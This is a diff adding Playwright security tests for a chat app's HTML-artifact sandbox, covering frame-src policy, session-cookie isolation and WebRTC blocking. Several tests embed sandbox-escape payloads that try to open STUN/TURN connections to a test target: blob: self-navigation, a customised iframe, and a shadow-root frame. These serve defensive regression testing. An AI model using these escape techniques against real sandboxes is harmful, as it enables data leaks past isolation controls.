@@ -104,6 +104,17 @@ async function openChat(page: Page, recs: CodeRec[]) {
       return null;
     };
   });
+  if (process.env.FRAME_SABOTAGE_HOST_CSP === "old") {
+    // Sabotage runs only: the host page's frame-src as it was ('self' blob:).
+    await page.route(`**/workspace/chats/${THREAD}`, async (route) => {
+      const response = await route.fetch();
+      const headers = response.headers();
+      headers["content-security-policy"] = (
+        headers["content-security-policy"] ?? ""
+      ).replace(/frame-src [^;]+/, "frame-src 'self' blob:");
+      await route.fulfill({ response, headers });
+    });
+  }
   await page.goto(`/workspace/chats/${THREAD}`);
   return log;
 }
@@ -566,4 +577,185 @@ test("review payload: a script hidden from the gateway's parser in a comment run
     expect(packets, opener).toEqual([]);
     await ctx.close();
   }
+});
+
+test("the host page frames only its listed paths: no bare 'self', no blob:", async ({
+  page,
+}) => {
+  const rec: CodeRec = {
+    id: ID("A"),
+    kind: "html",
+    title: "Tip",
+    html: CLEAN_PAGE,
+  };
+  const doc = page.waitForResponse(
+    (r) =>
+      r.url().endsWith(`/workspace/chats/${THREAD}`) &&
+      r.request().resourceType() === "document",
+  );
+  await openChat(page, [rec]);
+  const csp = (await doc).headers()["content-security-policy"] ?? "";
+  const frameSrc = /frame-src ([^;]+)/.exec(csp)![1]!.trim().split(/\s+/);
+  const origin = new URL(host()).host;
+  expect(frameSrc.sort()).toEqual(
+    [
+      "/api/artifacts/",
+      "/api/threads/",
+      "/mermaid-frame/",
+      "/mock/api/threads/",
+    ]
+      .map((p) => `http://${origin}${p}`)
+      .sort(),
+  );
+});
+
+/** An artifact whose ONE inline script, run again inside a blob: document it
+ * makes, would find WebRTC native there (no shim). The copy is byte-exact, so
+ * its hash is in the frame's policy, which the blob: document inherits. */
+function blobNavScript(udp: string, padMb: number): string {
+  return `
+(function () {
+  if (location.protocol === 'blob:') {
+    try { var p = new RTCPeerConnection({ iceServers: [{ urls: 'turn:${udp}?transport=udp', username: 'leak-user', credential: 'x' }, { urls: 'stun:${udp}' }] }); p.createDataChannel('x'); p.createOffer().then(function (o) { return p.setLocalDescription(o); }); } catch (e) {}
+    return;
+  }
+  var me = document.currentScript.textContent;
+  var pad = ${padMb} ? '<!--' + new Array(${padMb} * 1024 + 1).join(new Array(1025).join('x')) + '-->' : '';
+  var html = '<!doctype html><scr' + 'ipt>' + me + '</scr' + 'ipt>' + pad;
+  document.body.setAttribute('data-navigating', '1');
+  setTimeout(function () { location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' })); }, 1500);
+})();`;
+}
+
+for (const padMb of [0, 30]) {
+  test(`review payload: the frame navigating itself to a blob: copy of its own script sends no STUN/TURN (${padMb ? "padded" : "plain"})`, async ({
+    page,
+  }) => {
+    const refused: string[] = [];
+    page.on("console", (m) => {
+      if (/frame-src|Refused to frame/i.test(m.text())) refused.push(m.text());
+    });
+    const rec: CodeRec = {
+      id: ID("B"),
+      kind: "html",
+      title: "Blob",
+      html: doc(blobNavScript(udpTarget, padMb), "<main><p>blob</p></main>"),
+    };
+    await openChat(page, [rec]);
+    const frame = await liveFrame(page);
+    // The payload ran up to the navigation, and the host refused the frame's
+    // next document (frame-src lists no blob:).
+    await expect
+      .poll(
+        () =>
+          frame
+            .evaluate(() => document.body.dataset.navigating ?? "")
+            .catch(() => "gone"),
+        { timeout: 15_000 },
+      )
+      .toBe("1");
+    await page.waitForTimeout(6000);
+    expect(packets).toEqual([]);
+    await expect
+      .poll(() => refused.length, { timeout: 15_000 })
+      .toBeGreaterThan(0);
+    expect(refused.join("\n")).toMatch(/frame-src[\s\S]*blocked/);
+  });
+}
+
+test("a frame navigating itself to same-origin URLs arrives cross-site without the session cookie", async ({
+  page,
+}) => {
+  const seen: { path: string; cookie: string; site: string | undefined }[] = [];
+  await page.context().addCookies([
+    {
+      name: "access_token",
+      value: "session-cookie-value",
+      url: host(),
+      sameSite: "Lax",
+      httpOnly: true,
+    },
+  ]);
+  await page.route("**/api/threads/t-nav/**", async (route) => {
+    const h = await route.request().allHeaders();
+    seen.push({
+      path: new URL(route.request().url()).pathname,
+      cookie: h.cookie ?? "",
+      site: h["sec-fetch-site"],
+    });
+    await route.fulfill({
+      status: 401,
+      contentType: "application/json",
+      body: '{"detail":"Authentication required"}',
+    });
+  });
+  const rec: CodeRec = {
+    id: ID("N"),
+    kind: "html",
+    title: "Nav",
+    html: CLEAN_PAGE,
+  };
+  await openChat(page, [rec]);
+  const frame = await liveFrame(page);
+  await frame.evaluate(() => {
+    location.href =
+      "/api/threads/t-nav/artifacts/mnt/user-data/outputs/page.html";
+  });
+  await expect.poll(() => seen.length).toBeGreaterThan(0);
+  expect(seen[0]!.cookie).not.toContain("session-cookie-value");
+  if (seen[0]!.site !== undefined) expect(seen[0]!.site).toBe("cross-site");
+  // Positive control: the host page's own same-origin request carries it.
+  await page.evaluate(() =>
+    fetch("/api/threads/t-nav/control").catch(() => null),
+  );
+  await expect.poll(() => seen.length).toBeGreaterThan(1);
+  expect(seen[1]!.cookie).toContain("session-cookie-value");
+  await expect(
+    page.locator('[data-testid="artifact-frame-stopped"]'),
+  ).toBeVisible();
+});
+
+test("review payload: a customised built-in iframe gives no realm with WebRTC", async ({
+  page,
+}) => {
+  const script = `
+(function () {
+  try {
+    class F extends HTMLIFrameElement {}
+    customElements.define('x-frame', F, { extends: 'iframe' });
+    var f = new F();
+    f.srcdoc = ${JSON.stringify(`<script>try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udpTarget}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}</` + "script>").replace(/<\//g, "<\\/")};
+    document.body.appendChild(f);
+  } catch (e) { window.__err = String(e); }
+  document.body.setAttribute('data-rtc-done', '1');
+})();`;
+  await openChat(page, [
+    { id: ID("K"), kind: "html", title: "CE", html: doc(script) },
+  ]);
+  const frame = await liveFrame(page);
+  await page.waitForTimeout(4000);
+  expect(packets).toEqual([]);
+  expect(await frame.evaluate(() => document.body.dataset.rtcDone ?? "")).toBe(
+    "1",
+  );
+});
+
+test("review payload: a declarative shadow root holding a frame is swept", async ({
+  page,
+}) => {
+  const child =
+    `<script>try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udpTarget}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}</` +
+    `script>`;
+  const html = `<!doctype html><html><head></head><body><div id=h><template shadowrootmode="open"><iframe srcdoc="${child.replace(/"/g, "&quot;")}"></iframe></template></div><p>x</p></body></html>`;
+  await openChat(page, [{ id: ID("D"), kind: "html", title: "DSD", html }]);
+  const frame = await liveFrame(page);
+  await page.waitForTimeout(4000);
+  expect(packets).toEqual([]);
+  expect(
+    await frame.evaluate(
+      () =>
+        document.getElementById("h")?.shadowRoot?.querySelectorAll("iframe")
+          .length ?? -1,
+    ),
+  ).toBe(0);
 });
